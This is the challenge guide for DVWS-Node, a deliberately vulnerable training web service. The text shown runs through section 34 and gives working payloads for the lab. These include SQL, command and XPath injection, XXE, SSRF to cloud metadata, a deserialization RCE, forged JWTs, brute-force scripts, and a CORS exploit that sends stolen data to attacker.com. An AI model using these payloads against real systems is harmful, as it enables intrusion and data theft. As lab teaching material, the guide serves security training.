# DVWS-Node Challenge Guide

Damn Vulnerable Web Service (DVWS-Node) is a deliberately insecure web application for learning API and web service security testing. All services run on a single Express server.

**Base URL:** `http://dvws.local`

| Service   | Path                 | Description                       |
|-----------|----------------------|-----------------------------------|
| REST API  | `/api/v1/*`, `/api/v2/*` | Primary REST endpoints        |
| SOAP      | `/dvwsuserservice`   | SOAP/XML service with WSDL        |
| XML-RPC   | `/xmlrpc`            | XML-RPC method dispatch            |
| GraphQL   | `/graphql`           | GraphQL queries and mutations      |
| Swagger   | `/api-docs`          | OpenAPI documentation              |

**Default credentials:** `admin` / `letmein`, `test` / `test`

---

## Table of Contents

1. [SQL Injection](#1-sql-injection)
2. [NoSQL Injection](#2-nosql-injection)
3. [OS Command Injection](#3-os-command-injection)
4. [XML External Entity Injection (XXE)](#4-xml-external-entity-injection-xxe)
5. [XML Bomb (Denial of Service)](#5-xml-bomb-denial-of-service)
6. [Server-Side Request Forgery (SSRF)](#6-server-side-request-forgery-ssrf)
7. [Insecure Deserialization (RCE)](#7-insecure-deserialization-rce)
8. [XPath Injection](#8-xpath-injection)
9. [LDAP Injection](#9-ldap-injection)
10. [Path Traversal](#10-path-traversal)
11. [SOAP Injection](#11-soap-injection)
12. [XML Injection (Profile Export)](#12-xml-injection-profile-export)
13. [XML Injection (Profile Import / Mass Assignment)](#13-xml-injection-profile-import--mass-assignment)
14. [Mass Assignment (User Registration)](#14-mass-assignment-user-registration)
15. [IDOR - Insecure Direct Object Reference](#15-idor---insecure-direct-object-reference)
16. [Broken Authentication - JWT "none" Algorithm](#16-broken-authentication---jwt-none-algorithm)
17. [JWT Secret Key Brute Force](#17-jwt-secret-key-brute-force)
18. [Vertical Access Control (Privilege Escalation)](#18-vertical-access-control-privilege-escalation)
19. [Horizontal Access Control](#19-horizontal-access-control)
20. [Open Redirect](#20-open-redirect)
21. [Cross-Site Scripting (XSS)](#21-cross-site-scripting-xss)
22. [Cross-Site Request Forgery (CSRF)](#22-cross-site-request-forgery-csrf)
23. [CORS Misconfiguration](#23-cors-misconfiguration)
24. [CRLF Injection / Log Pollution](#24-crlf-injection--log-pollution)
25. [User Enumeration](#25-user-enumeration)
26. [Information Disclosure](#26-information-disclosure)
27. [Sensitive Data Exposure (Password Hashes)](#27-sensitive-data-exposure-password-hashes)
28. [Prototype Pollution](#28-prototype-pollution)
29. [API Endpoint Brute Forcing (Missing Rate Limit)](#29-api-endpoint-brute-forcing-missing-rate-limit)
30. [Rate Limit Bypass via X-Forwarded-For](#30-rate-limit-bypass-via-x-forwarded-for)
31. [Hidden API Functionality Exposure](#31-hidden-api-functionality-exposure)
32. [GraphQL Introspection](#32-graphql-introspection)
33. [GraphQL Access Control Issues](#33-graphql-access-control-issues)
34. [GraphQL Arbitrary File Write](#34-graphql-arbitrary-file-write)
35. [GraphQL Batching Brute Force](#35-graphql-batching-brute-force)
36. [GraphQL Sensitive Data Exposure](#36-graphql-sensitive-data-exposure)
37. [Unrestricted File Upload](#37-unrestricted-file-upload)
38. [Role-Based Profile Data Exposure](#38-role-based-profile-data-exposure)
39. [Account Recovery IDOR Chain](#39-account-recovery-idor-chain)
40. [Session Revocation After Password Change](#40-session-revocation-after-password-change)
41. [Cross-Site Request Forgery Through the Login Cookie](#41-cross-site-request-forgery-through-the-login-cookie)
42. [JSONP Cross-Origin Profile Sharing](#42-jsonp-cross-origin-profile-sharing)
43. [Cross-Site WebSocket Hijacking](#43-cross-site-websocket-hijacking)
44. [Server-Side Template Injection](#44-server-side-template-injection)
45. [Unsafe YAML Supplier Import](#45-unsafe-yaml-supplier-import)
46. [Cross-Customer Monthly Statement Path Traversal](#46-cross-customer-monthly-statement-path-traversal)
47. [Notification Preference Mass Assignment](#47-notification-preference-mass-assignment)
48. [Undocumented TRACE Diagnostics](#48-undocumented-trace-diagnostics)
49. [Legacy Login Skips Password Verification](#49-legacy-login-skips-password-verification)
50. [Excessive Activity Report Page Size](#50-excessive-activity-report-page-size)
51. [Missing Security Headers](#51-missing-security-headers)
52. [GraphQL Alias Amplification](#52-graphql-alias-amplification)
53. [Predictable UUID Support Ticket IDOR](#53-predictable-uuid-support-ticket-idor)
54. [Resource Store: Get an Item for Free](#54-resource-store-get-an-item-for-free)
55. [Resource Store: Increase Your Balance by 1,000 Credits](#55-resource-store-increase-your-balance-by-1000-credits)
56. [JWT JKU Key Source Trust](#56-jwt-jku-key-source-trust)
57. [JWT KID Path Traversal](#57-jwt-kid-path-traversal)
58. [Resource Store Promotion Timing Side Channel](#58-resource-store-promotion-timing-side-channel)

---

## 1. SQL Injection

**Endpoint:** `POST /api/v2/passphrase` and `GET /api/v2/passphrase/:username`

**Description:** User input is concatenated directly into raw SQL queries without parameterization.

### Challenge

Save a passphrase and then retrieve passphrases for a user you do not own.

### Solution

**Blind SQLi on the GET endpoint** -- the `:username` parameter is injected directly into a `SELECT` query:

```
GET /api/v2/passphrase/' OR '1'='1 HTTP/1.1
Host: dvws.local
```

This returns all passphrases in the database because the query becomes:
```sql
SELECT passphrase, reminder FROM passphrases WHERE username = '' OR '1'='1'
```

**SQLi on the POST endpoint** -- `passphrase` and `reminder` fields are injected into an `INSERT` statement:

```
POST /api/v2/passphrase HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
Content-Type: application/json

{
  "passphrase": "test', 'injected'); -- ",
  "reminder": "ignored"
}
```

---

## 2. NoSQL Injection

**Endpoint:** `POST /api/v2/notesearch`

**Description:** The search parameter is embedded directly into a MongoDB `$where` JavaScript expression.

### Challenge

Retrieve all notes in the database, not just public ones matching your search.

### Solution

```
POST /api/v2/notesearch HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
Content-Type: application/json

{
  "search": "' || '1'=='1"
}
```

The injected value breaks out of the string comparison and makes the `$where` clause always true:
```js
// Becomes: this.type == 'public' && this.name == '' || '1'=='1'
```

---

## 3. OS Command Injection

**Endpoint:** `GET /api/v2/sysinfo/:command`

**Description:** The `:command` parameter is passed directly to `child_process.exec()`.

### Challenge

Execute arbitrary OS commands on the server.

### Solution

```
GET /api/v2/sysinfo/uname;cat%20/etc/passwd HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
```

The semicolon terminates the first command and `cat /etc/passwd` executes as a second command. Other metacharacters also work: `|`, `&&`, backticks, `$()`.

---

## 4. XML External Entity Injection (XXE)

**Endpoint:** `POST /dvwsuserservice`

**Description:** The SOAP service deliberately resolves external XML entities before parsing the request, enabling file read through XXE.

### Challenge

Read arbitrary files from the server via the SOAP user lookup service.

### Solution

Discover the WSDL first:
```
GET /dvwsuserservice?wsdl HTTP/1.1
Host: dvws.local
```

Then send a malicious SOAP request with an XXE payload:

```xml
POST /dvwsuserservice HTTP/1.1
Host: dvws.local
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <username>&xxe;</username>
  </soapenv:Body>
</soapenv:Envelope>
```

The contents of `/etc/passwd` are returned in the `<username>` field of the SOAP response.

---

## 5. XML Bomb (Denial of Service)

**Endpoint:** `POST /api/v2/notes/import/xml`

**Description:** The XML notes import deliberately expands internal and external entities before parsing XML. Nested entities can consume large amounts of memory.

### Challenge

Cause a denial-of-service condition by importing a specially crafted XML document.

### Solution

**Quadratic Blowup Attack:**

```
POST /api/v2/notes/import/xml HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
Content-Type: application/json

{
  "xml": "<?xml version=\"1.0\"?><!DOCTYPE notes [<!ENTITY a \"AAAAAAAAAA... (repeat thousands of times)\">]><notes><note><name>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</name><body>boom</body></note></notes>"
}
```

The unbounded entity expansion can exhaust memory.

**XXE variant (file read via notes import):**

```json
{
  "xml": "<?xml version=\"1.0\"?><!DOCTYPE notes [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><notes><note><name>&xxe;</name><body>stolen</body></note></notes>"
}
```

---

## 6. Server-Side Request Forgery (SSRF)

**Endpoint:** `POST /xmlrpc`

**Description:** The `dvws.CheckUptime` XML-RPC method makes HTTP requests to any user-supplied URL using `needle.get()`.

### Challenge

Use the XML-RPC service to make requests to internal services or cloud metadata endpoints.

### Solution

First, list available methods:
```xml
POST /xmlrpc HTTP/1.1
Host: dvws.local
Content-Type: text/xml

<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params/>
</methodCall>
```

Then exploit SSRF with `dvws.CheckUptime`:
```xml
POST /xmlrpc HTTP/1.1
Host: dvws.local
Content-Type: text/xml

<?xml version="1.0"?>
<methodCall>
  <methodName>dvws.CheckUptime</methodName>
  <params>
    <param>
      <value><string>http://169.254.169.254/latest/meta-data/</string></value>
    </param>
  </params>
</methodCall>
```

This makes the server fetch the AWS metadata endpoint (or any internal URL).

---

## 7. Insecure Deserialization (RCE)

**Endpoint:** `POST /api/v2/export`

**Description:** The export endpoint Base64-decodes the `data` field and passes it to `node-serialize`'s `unserialize()`, which executes JavaScript IIFE expressions embedded in serialized objects.

### Challenge

Achieve remote code execution on the server through the PDF export feature.

### Solution

Craft a serialized payload with an IIFE (Immediately Invoked Function Expression):

```js
// Malicious serialized object:
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}
```

Base64-encode it and send:

```
POST /api/v2/export HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
Content-Type: application/json

{
  "data": "eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ2lkJyl9KCkifQ==",
  "username": "test",
  "password": "test"
}
```

The function executes during deserialization before any further processing.

---

## 8. XPath Injection

**Endpoint:** `GET /api/v2/release/:release`

**Description:** The `:release` parameter is concatenated directly into an XPath expression over `config/operations.xml`. The Resource Store reads the same document to validate active promotion codes and credit values. The release lookup should return only a matching version, but XPath injection can expose the promotion configuration.

### Challenge

Discover an active promotion code through the release lookup, redeem it in the Resource Store, and verify that your persisted credit balance increases.

### Solution

```
GET /api/v2/release/0.0.1'%20or%201=1%20or%20'a'='a HTTP/1.1
Host: dvws.local
```

The XPath query becomes:
```xpath
//config/*[local-name(.)='release' and //config//release/text()='0.0.1' or 1=1 or 'a'='a']
```

The injected predicate makes the lookup return the top-level `<resourceStore>` element as well as `<release>`. Copy the value in `<promotion><code>` from the response and redeem it with a signed-in account:

```http
POST /api/v2/resource-store/promotions/redeem HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
Content-Type: application/json

{"code":"<code returned by XPath>"}
```

The response reports the credited amount and new balance. `GET /api/v2/resource-store` shows the persisted balance and redemption. An unknown code is rejected; the same account cannot redeem a code twice. The ordinary release response and Resource Store catalogue do not disclose the code.

**Mitigation:** Use a fixed XPath expression with the release value passed as data, or compare the release element text directly. Keep promotion codes in a store that cannot be queried through public diagnostic endpoints.

---

## 9. LDAP Injection

**Endpoint:** `GET /api/v2/users/ldap-search?user=<input>` or `POST /api/v2/users/ldap-search`

**Description:** The `user` parameter is interpolated unescaped into the single LDAP-style filter `(&(objectClass=account)(|(uid=<input>)(cn=directory-service)))`. A Mongo-backed adapter evaluates RFC 4515-style equality, wildcard/presence, AND, OR, and NOT filters against application accounts. The `cn=directory-service` branch is a reserved directory alias; ordinary lookups match `uid`.

### Challenge

Look up an account, enumerate the directory, then alter the boolean filter to disclose an administrator's directory metadata.

### Solution

1. Normal lookup: `GET /api/v2/users/ldap-search?user=test`.
2. Wildcard enumeration: `GET /api/v2/users/ldap-search?user=*` matches every account with a `uid`.
3. Boolean injection: send `user=missing)(uid=admin` (URL encode the query value when needed). The resulting valid filter is `(&(objectClass=account)(|(uid=missing)(uid=admin)(cn=directory-service)))`, which returns the admin entry despite the nonexistent requested user.

The response retains `username`, `email`, `homeAddress`, and `permissions`, and adds `uid`, `cn`, `mail`, `description`, `uidNumber`, `gidNumber`, `homeDirectory`, and `objectClass`. The lab directory metadata is derived from existing users; it does not include password hashes or secrets. For a real service, escape the user value per RFC 4515, restrict returned fields by authorization, and use a supported LDAP library.

---

## 10. Path Traversal

**Endpoint:** `POST /api/download` (the `/download` route in `src/routes/files.js`, mounted under `/api` by the server)

**Description:** This endpoint requires a valid bearer token. It combines the token's username with `public/uploads/<username>/`, then passes the supplied `filename` through `path.resolve()` without restricting the result to that directory. Traversal sequences can therefore reach files outside the upload folder.

### Challenge

Download arbitrary files from the server filesystem.

### Solution

```
POST /api/download HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
Content-Type: application/json

{
  "filename": "../../../../../../../../etc/passwd"
}
```

Replace `<token>` with a valid login token. The `filename` is resolved relative to `public/uploads/<your-username>/`; enough `../` segments escape that folder. The endpoint sends the resolved file as a download.

---

## 11. SOAP Injection

**Endpoint:** `POST /dvwsuserservice`

**Description:** The username value extracted from the SOAP request is interpolated directly into the XML response without escaping. An attacker can inject XML tags to spoof response fields.

### Challenge

Manipulate the SOAP response to show an elevated role.

### Solution

```xml
POST /dvwsuserservice HTTP/1.1
Host: dvws.local
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <username>test</username><role>admin</role><username>ignore</username>
  </soapenv:Body>
</soapenv:Envelope>
```

The response XML contains a spoofed `<role>admin</role>` element injected between the real tags. A naive XML consumer that reads the first `<role>` element will see "admin" instead of the real role.

---

## 12. XML Injection (Profile Export)

**Endpoints:** `PUT /api/v2/users/profile/bio`, `POST /api/v2/users/profile/export/xml`, `POST /api/v2/users/profile/restore/xml`

**Description:** A signed-in user can edit their own stored bio. Profile export loads that account from the database and interpolates the saved bio into signed XML without encoding it. The profile restore workflow verifies the signature, then uses the last `<admin>` element it finds to update the same account. An injected bio can add a second `<admin>` element to a server-produced export.

### Challenge

Save a bio that adds an administrator element to your profile export. Restore that exact signed export and confirm that your account gains administrator privileges. A new login is needed for the token to include the new role.

### Solution

```
PUT /api/v2/users/profile/bio HTTP/1.1
Host: dvws.local
Authorization: Bearer <regular-user-token>
Content-Type: application/json

{
  "bio": "Regular bio</bio><admin>true</admin><bio>"
}
```

Export the saved profile with `POST /api/v2/users/profile/export/xml` and the same bearer token. The request body does not supply profile fields. Keep the exact XML response and its `X-Profile-Export-Signature` response header. The XML contains:
```xml
<userProfile>
  <username>test</username>
  <admin>false</admin>
  <bio>Regular bio</bio><admin>true</admin><bio></bio>
</userProfile>
```

Send `{"xml":"<exact export>","signature":"<X-Profile-Export-Signature>"}` to `POST /api/v2/users/profile/restore/xml` with the same bearer token. The restore response reports `admin: true`; signing in again gives the account administrator permissions. A hand-written XML document without the export signature is rejected. This is distinct from challenge 13's direct, unauthenticated import endpoint.

**Mitigation:** Escape all user-controlled values when serializing XML, and reject duplicate security-sensitive fields on import. A valid signature authenticates the bytes produced by the exporter; it does not make those bytes safe to interpret.

---

## 13. XML Injection (Profile Import / Mass Assignment)

**Endpoint:** `POST /api/v2/users/profile/import/xml`

**Description:** The XML profile import endpoint has no authentication and blindly accepts an `<admin>` field, allowing privilege escalation for any user.

### Challenge

Escalate a regular user to admin without knowing their password.

### Solution

```
POST /api/v2/users/profile/import/xml HTTP/1.1
Host: dvws.local
Content-Type: application/json

{
  "xml": "<userProfile><username>test</username><admin>true</admin><bio>hacked</bio></userProfile>"
}
```

Response:
```json
{
  "success": true,
  "message": "Profile updated successfully from XML.",
  "data": { "username": "test", "admin": true, ... }
}
```

No authentication required. The `<admin>true</admin>` field is blindly accepted and written to the database.

---

## 14. Mass Assignment (User Registration)

**Endpoint:** `POST /api/v2/users`

**Description:** The entire `req.body` is passed directly to `new User(req.body)`. Since the Mongoose schema includes an `admin` field, it can be set at registration time.

### Challenge

Register a new user account with admin privileges.

### Solution

```
POST /api/v2/users HTTP/1.1
Host: dvws.local
Content-Type: application/json

{
  "username": "attacker",
  "password": "password123",
  "admin": true
}
```

The new user is created with `admin: true`. Logging in will return a JWT with `user:admin` permission.

---

## 15. IDOR - Insecure Direct Object Reference

**Endpoint:** `GET /api/v2/notes/:noteId`, `PUT /api/v2/notes/:noteId`, `DELETE /api/v2/notes/:noteId`

**Description:** Notes are accessed by their sequential numeric `no` field. No ownership check is performed -- any authenticated user can read, modify, or delete any other user's notes.

### Challenge

Access another user's private notes by enumerating IDs.

### Solution

```
GET /api/v2/notes/1 HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
```

Increment the ID to enumerate: `/api/v2/notes/2`, `/api/v2/notes/3`, etc. Private notes (type != "public") belonging to other users are returned without restriction.

Delete another user's note:
```
DELETE /api/v2/notes/targetNoteName HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
```

---

## 16. Broken Authentication - JWT "none" Algorithm

**Endpoint:** All authenticated endpoints

**Description:** JWT verification accepts `algorithms: ["HS256", "none"]` and `ignoreExpiration: true`. The `none` algorithm means the signature is not verified.

### Challenge

Forge a JWT token to authenticate as any user, including admin.

### Solution

1. Take any valid JWT and decode the payload (Base64):
   ```json
   {"user": "test", "permissions": ["user:read", "user:write"]}
   ```

2. Modify the header to use `"alg": "none"` and set the payload to admin:
   ```
   Header:  {"alg": "none", "typ": "JWT"}
   Payload: {"user": "admin", "permissions": ["user:read", "user:write", "user:admin"]}
   ```

3. Base64url-encode both parts, join with `.`, and append a trailing `.` (empty signature):
   ```
   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJwZXJtaXNzaW9ucyI6WyJ1c2VyOnJlYWQiLCJ1c2VyOndyaXRlIiwidXNlcjphZG1pbiJdfQ.
   ```

4. Use this forged token in the `Authorization: Bearer <token>` header.

---

## 17. JWT Secret Key Brute Force

**Endpoint:** All authenticated endpoints

**Description:** The JWT signing secret is a weak, dictionary-guessable value.

### Challenge

Brute-force the JWT secret key to forge arbitrary tokens.

### Solution

```python
import jwt

token = "<captured-jwt-token>"
wordlist = open("wordlist.txt").read().splitlines()

for word in wordlist:
    try:
        decoded = jwt.decode(token, word, algorithms=["HS256"])
        print(f"Secret found: {word}")
        print(f"Decoded: {decoded}")
        break
    except jwt.InvalidSignatureError:
        continue
```

The secret key is `access`. Once found, forge admin tokens:

```python
import jwt
payload = {
    "user": "admin",
    "permissions": ["user:read", "user:write", "user:admin"]
}
token = jwt.encode(payload, "access", algorithm="HS256")
print(token)
```

---

## 18. Vertical Access Control (Privilege Escalation)

**Endpoints:** `GET /api/v2/sysinfo/uname`, `GET /api/v2/users`, `POST /dvwsuserservice`

**Description:** Admin-only functionality is accessible to regular users or even unauthenticated users.

### Challenge

Access admin-only endpoints with a regular user token.

### Solution

**System info (should be admin-only):**
```
GET /api/v2/sysinfo/uname HTTP/1.1
Host: dvws.local
Authorization: Bearer <regular-user-token>
```

**All user data including password hashes:**
```
GET /api/v2/users HTTP/1.1
Host: dvws.local
Authorization: Bearer <regular-user-token>
```

**SOAP service (no authentication at all):**
```xml
POST /dvwsuserservice HTTP/1.1
Host: dvws.local
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <username>admin</username>
  </soapenv:Body>
</soapenv:Envelope>
```

---

## 19. Horizontal Access Control

**Endpoints:** `GET /api/v2/passphrase/:username`, `GET /api/v2/notes/:noteId`

**Description:** Users can access other users' data. The passphrase endpoint requires no authentication at all.

### Challenge

Read another user's passphrases and notes.

### Solution

**Read any user's passphrases (no auth needed):**
```
GET /api/v2/passphrase/admin HTTP/1.1
Host: dvws.local
```

**Read any user's notes (any valid token works):**
```
GET /api/v2/notes/1 HTTP/1.1
Host: dvws.local
Authorization: Bearer <any-valid-token>
```

---

## 20. Open Redirect

**Endpoint:** `GET /api/v2/users/logout/:redirect`

**Description:** The `:redirect` parameter is passed directly to `res.redirect()` with an `http://` prefix.

### Challenge

Redirect a user to a malicious site via the logout endpoint.

### Solution

```
GET /api/v2/users/logout/evil.com HTTP/1.1
Host: dvws.local
```

Response: `302 Found` with `Location: http://evil.com`

Craft a phishing link: `http://dvws.local/api/v2/users/logout/attacker.com/phishing`

---

## 21. Cross-Site Scripting (XSS)

### 21a. XML XSS via SOAP Service

**Endpoint:** `POST /dvwsuserservice`

The SOAP response reflects the username value. If a client-side application renders this XML without sanitization, the user can inject HTML:

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <username>&lt;script&gt;alert(1)&lt;/script&gt;</username>
  </soapenv:Body>
</soapenv:Envelope>
```

If the front-end decodes the XML entities and renders the result with `innerHTML`, the script executes.

### 21b. Content-Type XSS

**Endpoint:** `POST /api/v2/users`

The registration response reflects the username with `Content-Type: text/plain` but no explicit `X-Content-Type-Options: nosniff` header. Register with:

```json
{
  "username": "<script>alert(1)</script>",
  "password": "test"
}
```

Browsers that perform MIME sniffing may execute the script.

---

## 22. Cross-Site Request Forgery (CSRF)

**Endpoint:** `POST /api/v2/admin/create-user`

**Description:** This endpoint reads authentication from an `HttpOnly` cookie (`auth_token`) and accepts JSON in a `text/plain` body, so a cross-origin form-like request can create an account without a CORS preflight. Use the HTTPS browser setup in challenge 41 for a browser-realistic demonstration: the HTTPS login cookie uses `SameSite=None; Secure`; the plain HTTP development cookie uses `SameSite=Lax` and may not accompany a cross-site POST.

### Challenge

Create an admin user by tricking a logged-in admin into visiting a malicious page.

### Solution

Host this HTML on an attacker-controlled page:

```html
<html>
<body>
<script>
fetch('https://dvws.local:8443/api/v2/admin/create-user', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: { 'Content-Type': 'text/plain' },
    body: JSON.stringify({
        username: 'hacker_admin',
        password: 'hacked',
        admin: true
    })
});
</script>
</body>
</html>
```

When an admin visits this page, their `auth_token` cookie is included automatically. The endpoint parses JSON from `text/plain` bodies, creating the attacker's admin account.

For a browser-based demonstration, serve the page from `https://attacker.test:8443` with trusted local TLS and allow third-party cookies if the browser blocks them. Challenge 41 walks through the cookie attributes and provides the attacker-origin fixture.

---

## 23. CORS Misconfiguration

**Endpoint:** All endpoints

**Description:** CORS is configured with `origin: true` (reflects any origin) and `credentials: true`, allowing any website to make authenticated cross-origin requests.

### Challenge

Steal data from the API cross-origin.

### Solution

Host on attacker-controlled domain:

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://dvws.local/api/v2/passphrase/admin', true);
xhr.withCredentials = true;
xhr.onload = function() {
    // Send stolen data to attacker server
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(xhr.responseText));
};
xhr.send();
</script>
```

The server reflects the attacker's origin in `Access-Control-Allow-Origin` and sets `Access-Control-Allow-Credentials: true`, so the browser allows the cross-origin response to be read.

---

## 24. CRLF Injection / Log Pollution

**Endpoint:** `POST /api/v2/login`

**Description:** The username from login attempts is logged without sanitizing newline characters. Logs are viewable at `GET /api/v2/admin/logs`.

### Challenge

Forge a fake log entry showing a successful admin login from a different IP.

### Solution

```
POST /api/v2/login HTTP/1.1
Host: dvws.local
Content-Type: application/json

{
  "username": "attacker\n[2026-01-01T00:00:00.000Z] Login attempt from IP:10.0.0.1 User:admin",
  "password": "anything"
}
```

View the poisoned logs:
```
GET /api/v2/admin/logs HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
```

The injected newline creates a fake log line that appears to show a login from a different IP.

---

## 25. User Enumeration

### 25a. Via Login API

**Endpoint:** `POST /api/v2/login`

```
POST /api/v2/login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": "wrong"}
```

- **Existing user:** `401` with `"Authentication error"`
- **Non-existent user:** `404` with `"Login Failed! User foobar not found!"`

The different status codes and messages reveal whether a username exists.

### 25b. Via SOAP Service

**Endpoint:** `POST /dvwsuserservice`

```xml
POST /dvwsuserservice HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <username>admin</username>
  </soapenv:Body>
</soapenv:Envelope>
```

The SOAP response contains the user's role (`admin` or `user`) confirming the account exists.

---

## 26. Information Disclosure

### 26a. Environment Variables

**Endpoint:** `GET /api/v1/info`

```
GET /api/v1/info HTTP/1.1
Host: dvws.local
```

Returns `process.env` (database credentials, JWT secret, etc.), Node.js version, OpenSSL version, platform details, and module load list. Note: `/api/v2/info` returns 403, but v1 is unprotected.

### 26b. Stack Traces

Send malformed requests to various endpoints to trigger unhandled errors. Stack traces reveal file paths, framework versions, and internal structure.

### 26c. Technology Fingerprinting

The `X-Powered-By: Express` header is present on all responses by default.

---

## 27. Sensitive Data Exposure (Password Hashes)

**Endpoint:** `GET /api/v2/users` and `POST /graphql`

### Challenge

Retrieve bcrypt password hashes for all users.

### Solution

**Via REST API:**
```
GET /api/v2/users HTTP/1.1
Host: dvws.local
Authorization: Bearer <any-valid-token>
```

Returns all user documents including `password` (bcrypt hash) fields.

**Via GraphQL:**
```graphql
POST /graphql HTTP/1.1
Content-Type: application/json

{
  "query": "{ userFindbyId(id: \"<user-id>\") { id username password admin } }"
}
```

The `User` GraphQL type exposes the `password` field containing the bcrypt hash.

---

## 28. Prototype Pollution

**Endpoint:** `POST /api/upload`

**Description:** A custom `merge()` function recursively merges user-supplied JSON metadata into an object without checking for `__proto__` or `constructor` keys.

### Challenge

Use a prototype-polluted upload metadata object to alter the upload handler's ordinary extension policy and upload an HTML file, which the default `.xml` policy rejects.

### Solution

```
POST /api/upload HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="metadata"

{"__proto__": {"allowedExtension": ".html"}}
------Boundary
Content-Disposition: form-data; name="file"; filename="test.html"
Content-Type: text/html

<h1>uploaded through the polluted extension policy</h1>
------Boundary--
```

The recursive merge writes `allowedExtension` onto `Object.prototype`. The upload handler reads that inherited property when selecting its allowed extension, accepts the HTML file, and saves it in the authenticated user's upload directory. The inherited setting affects later requests in that server process until a subsequent metadata merge sets it to `null`, which removes the property.

---

## 29. API Endpoint Brute Forcing (Missing Rate Limit)

**Endpoint:** `POST /api/v2/export`

**Description:** The export endpoint verifies username + password credentials before generating a PDF, but has no rate limiting (unlike the login endpoint).

### Challenge

Brute-force a user's password through the export endpoint.

### Solution

```python
import requests

url = "http://dvws.local/api/v2/export"
headers = {"Authorization": "Bearer <token>"}

with open("passwords.txt") as f:
    for password in f:
        password = password.strip()
        r = requests.post(url, json={
            "data": "W10=",  # Base64 for "[]"
            "username": "admin",
            "password": password
        }, headers=headers)
        if r.status_code != 401:
            print(f"Password found: {password}")
            break
```

No rate limit is applied, so thousands of attempts can be made rapidly.

---

## 30. Rate Limit Bypass via X-Forwarded-For

**Endpoint:** `POST /api/v2/login`

**Description:** The rate limiter identifies clients by the `X-Forwarded-For` header, which can be spoofed.

### Challenge

Bypass the login rate limit to brute-force credentials.

### Solution

Rotate the `X-Forwarded-For` header with each request:

```python
import requests

url = "http://dvws.local/api/v2/login"

for i in range(1000):
    headers = {"X-Forwarded-For": f"10.0.0.{i % 256}"}
    r = requests.post(url, json={
        "username": "admin",
        "password": f"attempt{i}"
    }, headers=headers)
    if r.status_code == 200:
        print(f"Login successful with attempt {i}")
        break
```

Each spoofed IP gets its own rate limit bucket (100 attempts per 30 seconds), effectively removing the limit.

---

## 31. Hidden API Functionality Exposure

**Endpoint:** `GET /api-docs`

**Description:** Swagger/OpenAPI documentation is publicly accessible and reveals all API endpoints, including those not exposed through the front-end UI.

### Challenge

Discover hidden administrative endpoints.

### Solution

Browse to `http://dvws.local/api-docs/` or fetch the raw spec:

```
GET /openAPI-spec.json HTTP/1.1
Host: dvws.local
```

This reveals endpoints like:
- `GET /api/v1/info` -- server environment variables
- `GET /api/v2/users` -- all user data
- `POST /api/v2/admin/create-user` -- admin user creation
- `GET /api/v2/admin/logs` -- login logs

---

## 32. GraphQL Introspection

**Endpoint:** `POST /graphql`

**Description:** GraphQL introspection is enabled, allowing full schema discovery.

### Challenge

Map the entire GraphQL schema to discover all queries, mutations, and types.

### Solution

```graphql
POST /graphql HTTP/1.1
Content-Type: application/json

{
  "query": "{ __schema { types { name fields { name type { name kind ofType { name } } } } } }"
}
```

Or use a full introspection query to discover:
- **Queries:** `userFindbyId`, `userSearchByUsername`, `noteFindbyId`, `readNote`, `getPassphrase`
- **Mutations:** `updateUserUploadFile`, `userLogin`, `createNote`
- **Types:** `User` (exposes `password` field), `Notebook`, `File`, `Passphrase`

Tools like GraphQL Voyager or InQL can visualize the schema.

---

## 33. GraphQL Access Control Issues

**Endpoint:** `POST /graphql`

**Description:** Several GraphQL resolvers lack proper authorization checks.

### Challenge

Read other users' notes and data through GraphQL.

### Solution

**Read any user's notes (requires any valid token):**
```graphql
{
  "query": "{ readNote(name: \"admin_secret_note\") { name body user type } }"
}
```

**Look up any user (exposes password hash):**
```graphql
{
  "query": "{ userFindbyId(id: \"<user-object-id>\") { username password admin } }"
}
```

**Search any username:**
```graphql
{
  "query": "{ userSearchByUsername(username: \"admin\") { id username admin } }"
}
```

---

## 34. GraphQL Arbitrary File Write

**Endpoint:** `POST /graphql` (mutation: `updateUserUploadFile`)

**Description:** The `filePath` argument is concatenated to the upload directory without sanitization, allowing path traversal to write files anywhere on the filesystem.

### Challenge

Write an arbitrary file to the server filesystem via GraphQL.

### Solution

```graphql
POST /graphql HTTP/1.1
Authorization: Bearer <token>
Content-Type: application/json

{
  "query": "mutation { updateUserUploadFile(filePath: \"../../../../../../tmp/pwned.txt\", fileContent: \"You have been hacked\") { filePath fileContent } }"
}
```

